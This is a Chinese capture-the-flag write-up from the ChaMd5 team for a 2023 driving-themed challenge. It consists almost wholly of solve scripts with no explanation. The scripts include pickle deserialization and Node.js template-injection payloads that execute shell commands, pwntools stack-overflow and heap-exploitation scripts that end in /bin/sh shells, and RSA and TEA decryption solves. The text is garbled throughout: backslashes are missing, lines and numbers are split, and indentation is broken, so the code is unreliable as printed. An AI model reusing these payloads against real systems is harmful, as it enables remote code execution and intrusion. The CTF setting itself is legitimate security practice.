# 2023WIDC世界智能驾驶挑战赛 writeup ChaMd5

> 原文: https://www.ctfiot.com/112792.html
> ID: 112792

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
import pickle, pickletools, subprocess
import requests
import base64
session = requests.session()
a = b'cbuiltinsngetattrnp0n0cbuiltinsndictnp1n0g0n(g1nS'get'ntRp2n0cbuiltinsnglobalsn(tRp3n0g2n(g3nS'builtins'ntRp4n0g0n(g4nS'eval'ntRp5n0g5n(S'open("/tmp/res").read()'ntR.'
    #a = b'cbuiltinsngetattrnp0n0cbuiltinsndictnp1n0g0n(g1nS'get'ntRp2n0cbuiltinsnglobalsn(tRp3n0g2n(g3nS'builtins'ntRp4n0g0n(g4nS'eval'ntRp5n0g5n(S'open("/f1ag").read()'ntR.'
    #a = b"(ibuiltinsn__loader__np0n0cbuiltinsngetattrnp1n0g1n(g0nS'load_module'ntRp2n0g1n(g2n(S'os'ntRS'system'ntR(S'/flag.sh >/tmp/res'ntR."
try:
 #   pickle.loads(a)
    pass
except Exception as e:
    print(e)
info = base64.b64encode(a)

burp0_url = "http://123.127.164.29:
22547/deserialize"
burp0_cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWV9.ZEnLXA.Ovfb2CjwDPkteh5YnY6KoedxfqI"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://123.127.164.29:
22547", "Connection": "close", "Referer": "http://123.127.164.29:
22547/deserialize", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"payload": info, "token": "super_secret_key"}
r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies={'http':'http://127.0.0.1:
8080'})
print(r.text)
name=%7B%7Brange.constructor%28%22return+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27ls+%2F%27%29%22%29%28%29%7D%7D
name=%7B%7Brange.constructor%28%22return+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27%2Fflag%27%29%22%29%28%29%7D%7D
from hashlib import md5
import sympy
info = 8624427976171269462118041236131860880353185724611115567769031391985212205334299206262416050893790496280487822633821896510164798860649610314643858720250778483148210218901983626065047187632632798657803619845039340275071550929875181405670087477995477977547400586054837874496784983655506143028794707073522709491957889389497112122398129617977201085938125308438851338856122300458905698778054527484342442183812543835926984418962888390266572594876953921925983459356710496966798344822306906157437194702449649080264101152002664874120624149638832121202508620869036457251193215517734116478672807574868697528296087842179376581201
n = 14646253358612854593317963725110988740491254060490903007910848037596846774729618833633231941531333403744010619378997475183337224450843648913131458780615463900296389211449668911282991115171184653170167906062913921232964400561146792601325354025107183172114144784169596208877805222213699601989143210211038189598547685022247536976806315807057890676464430811813960217168432160091360752223667140817878444045222127700744845352705982947205350416033568820758533074931871448795787684898779195153103174867673372027411790194468629972797561036156241378564908390993235826771493427813472825015487027549142331247821510473393248474487
e = 68719476737
k=(e*info-1)//n
add=(e*info-1-k*n-k)//(e-k)
p,q=sympy.symbols("p,q")
print(sympy.solve([p+q-add,p*q-n],[p,q]))
p=10648325409310539603954817472651767692771885225509619075229613203489952303
2039581518836610008572324412615776119186371272360118108406189595101288328995
2180569636166513621383397769713218730021947921557868350678748362459064891512
3592203734384978506999923834505894955672057249628115810026233796755299028665
8700181
q=13754513311366931462723152897386549096159898444365305128171546227905067384
2207467884506102766855502137212910483535434830748841956672570579115175710704
2033201349643490935542192687801502757982689485952839309574169464246916603725
3901382577120525282497376615132418910435511375865139198123332407851400552786
4881627
flag = "flag{%s}"%(md5(str(p).encode()+str(q).encode()).hexdigest())
print(flag)
print("flag_md5 = %s"%md5(flag.encode()).hexdigest())
    #flag{6c4d43632130e80aecb991c178ad6bd2}
from Crypto.Util.number import *
import gmpy2
from hashlib import md5
a = 33022028261473232777495374489369984051173051765914698583738518002899904080523156837934749116742046277602367384435566675571554308103705904368259935553616909439053270303487771097937681411464233154789299798806729983958502682142190437300710333776343215351258409122741296694039365121701417931039351706449620933965
b = 81094699539404597343145361125240498679809760332244536460451475832258379562399932681242912311485592104271252217309012830898060896041053659829385735202726553288600509493460180497835520339585127754273226762440611089795375598402111645618656148576588630597445547241467407938373779128315636192164727397109721371821
o = 84271446189918339833844652348525276763886039158109929437916837238145526361383913885452712470249189911870483017509012824863702488719752612973997881394827167428837538802085223497834025041680433523842549305188960285145390142799963207261252716937469861672320881012026095221908641651584348583973984309599037601834
s = 15123960887720641582473419411098607262340676763761583670149167561153634913307686118729176007021398862293975304379052309333724796000639317958549447559668843718134962233429595288688678289005300880495334503517799794958574524554067587882588738019194484329080120346211069604574355250202792739546620819511246051563
e = 2023
a0=pow(s-e,e)-b
a1=pow(o-e,e)-a
p=gmpy2.gcd(a0,a1)
q=(o-e)%p
r=(s-e)%p
for i in range(100):
 l=r+i*p
 if(isPrime(l)==1):
 print(l)
 print(len(bin(l)[2:]))
q=11220044900392716938921280108187708352150200105045242914173487438304022590375403339218715504403820750419125000304805938553629692586833461426730947999902413
r=11685130302881085842199331067286056686515698831498177641260324416454995221339455682157575186106400468653583016527167401973709969366148313456055795823198709
flag = "flag{%s}"%md5(str(p+q+r).encode()).hexdigest()
flag_md5 = md5(str(flag).encode()).hexdigest()
print(flag)
print(flag_md5)
    #flag{e2aab18eab877479ff9fd357a109f37e}
#/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import time
proc="./mydear"

elf=ELF(proc)

def get_current_second():
    current_time = time.localtime()
    return current_time.tm_sec

def pwn(ip,port,debug):
 global sh
 if debug==1:
  context.log_level="debug"
  sh=process(proc)
 else:
  context.log_level="debug"
  sh=remote(ip,port)

 #gdb.attach(sh,"b * 0x004009D2")
 # gdb.attach(sh,"b * 0x00004009E7")

 sh.sendlineafter("please tell me,what is your name?n","A"*0x4)

 times = get_current_second() 
 log.info("time: "+ hex(times))
 sh.sendlineafter("can you tell me this is the second?n",str(times))
 payload = 'A'*0x48+p64(0x000000040089B)
 sh.sendlineafter("Is there something you want to tell me?",payload)
 sh.interactive()

if __name__ =="__main__":
 pwn("123.127.164.29",22424,0)
#/usr/bin/env python
#-*-coding:
utf-8-*-
from pwn import *
context(os='linux',arch='amd64', log_level='debug')
    #libc=ELF('./libc.so.6')
proc="./inuse"
libc=ELF('./libc-2.31.so')
elf=ELF(proc)

def show(index):
 sh.sendafter("5.exitn",str(2))
 sh.sendafter("id:n",str(index))

def add(size):
 sh.sendafter("5.exitn",str(1))
 sh.sendafter("size:n",str(size))

def delete(index):
 sh.sendafter("5.exitn",str(3))
 sh.sendafter("id:n",str(index))

def edit(index,content):
 sh.sendafter("5.exitn",str(4))
 sh.sendafter("id:n",str(index))
 sh.send(content)

def pwn(ip,port,debug):
 global sh
 if debug==1:
  context.log_level="debug"
  sh=process(proc)
 else:
  context.log_level="debug"
  sh=remote(ip,port)
 
 add(0x420)
 add(0x18)
 delete(0)
 show(0)

 libc_base = u64(sh.recv(6).ljust(8,"x00")) -0x1ebbe0
 commend = libc_base + 0x1b75aa-1
 log.info("[*]__libc_base:"+hex(libc_base))

 add(0x30)
 add(0x30)
 delete(3)
 delete(2)
 edit(2,p64(libc_base+0x1ebb60))
 
 add(0x30)
 add(0x30)
 edit(5,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))

 add(0x10)
 add(0x10)
 delete(7)
 delete(6)
 edit(6,p64(libc_base+0x1ebb70))

 add(0x10)
 add(0x10)
 add(0x10)
 add(0x10)
 delete(11)
 delete(10)
 add(0x10)
 add(0x10)
 add(0x10)
 add(0x10)

 delete(15)
 delete(14)
 
 edit(14,p64(libc_base+libc.sym['system']))
 add(0x10)
 delete(9)
 
 add(str(commend))

 sh.interactive()

if __name__ =="__main__":
 pwn("123.127.164.29",22397 ,0)

"""

0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
#/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *

proc="./easy_heap"

elf=ELF(proc)

def show(index):
 sh.sendafter(": ",str(2))
 sh.sendafter(" index:n",str(index))

def add(size,index,content):
 sh.sendafter(": ",str(1))
 sh.sendafter("size :n",str(size))
 sh.sendafter("index :n",str(index))
 sh.sendafter("content: n",content)

def delete(index):
 sh.sendafter(": ",str(3))
 sh.sendafter("index: n",str(index))

def pwn(ip,port,debug):
 global sh
 if debug==1:
  context.log_level="debug"
  sh=process(proc)
 else:
  context.log_level="debug"
  sh=remote(ip,port)

 for i in range(1,8):
  add(0x70,i,"A")
 add(0x4f8,8,"A")
 add(0x30,9,"A")
 add(0x70,10,"A")
 add(0x70,11,"A")
 add(0x70,12,"A")
 for i in range(1,8):
  delete(i)
 # Double free 
 delete(8)
 show(8)
 sh.recvuntil("x0a")
    
 libc_base = u64(sh.recv(6).ljust(8,'x00')) - 0x3ebca0
 free_hook = libc_base + 0x3ed8e8
 one = libc_base + 0x4f302
 log.info("[*]__free_hook: " + hex(free_hook))
 log.info("[*]__libc_base: " + hex(libc_base))
    
   
 delete(10)
 delete(11)
 delete(10)
 for i in range(1,8):
  add(0x70,i+12,"A")
 add(0x70,20,p64(free_hook))
 add(0x70,21,p64(0))
 add(0x70,22,p64(0))
 # gdb.attach(sh)
 add(0x70,23,p64(one))
 delete(22)

 sh.interactive()

if __name__ =="__main__":
 pwn("123.127.164.29", 22376 ,1)

"""
x/20gx $rebase(0x000202060)
0x565222b1b060 : 0x0000000000000000 0x0000565223a1f260
0x565222b1b070 : 0x0000565223a1f280 0x0000565223a1f2a0
0x565222b1b080 : 0x0000565223a1f2c0 0x0000565223a1f2e0
0x565222b1b090 : 0x0000565223a1f300 0x0000000000000000
local and remote
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""
def sub_401040(a1, a2):
    if a1 == a2:
        return 0
    if a1 > a2:
        a1, a2 = a2, a1
    
    v5 = 0
    while (1 << v5 <= a2):
        v5 += 1
    
    v6 = sub_401000(a1, v5)
    v7 = sub_401000(a2, v5)
    return sub_401000((v6 ^ v7) & ((1 << v5) - 1), v5)

def sub_401000(a1, a2):
    v2 = 0
    for v3 in range(a2):
        v2 |= ((a1 >> v3) & 1) << (a2 - 1 - v3)
    return v2

dec = [0xB1, 0xE2, 0xA7, 0x8C, 0xE3, 0xA3, 0xB6, 0xA1, 0xE7, 0xA7, 0xBA, 
       0x9C, 0xBD, 0x8C, 0xBA, 0xE6, 0x8C, 0xB5, 0xA6, 0x9D, 0xBD, 0xAA, 0xF2
    ]
for i in range(23):
    for j in range(256):
        if sub_401040(j,0xD3) == dec[i]:
            print(chr(j),end='')
            break
__int64 __fastcall sub_400686(unsigned int *a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int v0; // [rsp+18h] [rbp-18h]
  unsigned int v1; // [rsp+1Ch] [rbp-14h]
  unsigned int sum; // [rsp+20h] [rbp-10h]
  unsigned int i; // [rsp+24h] [rbp-Ch]
  int v7; // [rsp+28h] [rbp-8h]
  int v8; // [rsp+2Ch] [rbp-4h]

  v0 = *a1;
  v1 = a1[1];
  sum = 0;
  v7 = 0xFEB3D971;
  v8 = 0x85EBCA77;
  for ( i = 0; i <= 0x1F; ++i )
  {
    sum += v7;
    v0 += (((v1 >> 5) ^ (16 * v1)) + v1) ^ (*(_DWORD *)(4LL * (sum & 3) + a2) + sum);
    v1 += (((v0 >> 5) ^ (16 * v0)) + v0) ^ (*(_DWORD *)(4LL * ((sum >> 11) & 3) + a2) + sum);
    if ( i == 15 )
      v7 = v8;
    if ( i == 23 )
    {
      v8 = 0x9E3779B9;
      v7 = 0x9E3779B9;
    }
  }
  *a1 = v0;
  result = v1;
  a1[1] = v1;
  return result;
}
s2[0] = 0xACA2A420;
  s2[1] = 0xF835FCA4;
  s2[2] = 0xAC0D6E57;
  s2[3] = 0x5499EBAE;
  s2[4] = 0x26F39D3A;
  s2[5] = 0xE478EBF8;
v5[0] = 0xDEADBEEF;
  v5[1] = 0x87654321;
  v5[2] = 0xABCDEF01;
  v5[3] = 0x23456789;
    #include <stdio.h>
    #include <stdint.h>

int main()
{
    unsigned int const key[4] = { 0xDEADBEEF,0x87654321,0xABCDEF01,0x23456789 };
    unsigned int v[6] = {0xACA2A420,0xF835FCA4,0xAC0D6E57,0x5499EBAE,0x26F39D3A,0xE478EBF8};
    unsigned int tmp[2] = {0, 0};
    
    for (int j = 0; j <= 5; j=j+2) {
        unsigned int i = 0;
        unsigned int sum = 0;

        tmp[0] = v[j];
        tmp[1] = v[j+1];

        int v9 = 0xFEB3D971;

        for(int k=0;k<=31;k++){
            sum +=v9;
            if(k==15){
                v9=0x85EBCA77;
            }
            if(k==23){
                v9=0x9E3779B9;
            }

        }
        // printf("sum:0x%xn",sum);
        int v7 = 0x9E3779B9;
        int v8 = 0x85EBCA77;
        for (int i = 31;i>=0;i--){
            if ( i == 23 )
                v7 = v8;
            if ( i == 15 )
            {
              // v8 = 0xFEB3D971;
              v7 = 0xFEB3D971;
            }

            tmp[1] -= ((((tmp[0] << 4) ^ (tmp[0] >> 5)) + tmp[0]) ^ ((key[(sum >> 11) & 3]) + sum));
            tmp[0] -= (((key[sum & 3] + sum) ^ ((tmp[1] << 4) ^ (tmp[1] >> 5)) + tmp[1]));
            sum -= v7;
            
        }

        v[j] = tmp[0];
        v[j+1] = tmp[1];
    }

    printf("解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%xn", v[0], v[1], v[2], v[3], v[4], v[5]);

    return 0;
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1682730370.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682730370.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/5-1682730373.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1682730375.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1682730376.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682730376.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1682730376.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1682730377.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682730378.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1682730379.png)